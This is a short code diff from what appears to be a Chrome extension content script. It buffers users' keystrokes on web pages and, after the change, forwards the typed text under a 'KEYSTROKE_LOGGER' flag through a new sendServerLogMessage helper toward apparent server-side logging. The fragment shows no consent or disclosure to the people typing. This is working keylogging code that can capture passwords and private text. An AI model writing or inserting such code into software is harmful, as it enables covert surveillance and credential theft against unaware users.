@@ -3,8 +3,26 @@ let timeoutId;
 
 function debounceLogger() {
   console.log("Final input:", buffer.trim());
-  chrome.runtime.sendMessage({ action: 'keystroke', text: buffer.trim() });
+  sendServerLogMessage("KEYSTROKE_LOGGER",{ text: buffer.trim() });
   buffer = "";
+}
+
+const sendServerLogMessage = (flagKey, attachment = "") => {
+  return new Promise((resolve, reject) => {
+    chrome.runtime.sendMessage(
+      {
+        action: "LOG_MESSAGE",
+        flagKey,
+        attachment
+      },
+      (response) => {
+        if (chrome.runtime.lastError) {
+          return reject(chrome.runtime.lastError)
+        }
+        resolve(response)
+      }
+    )
+  })
 }
 
 document.addEventListener('keydown', (event) => {
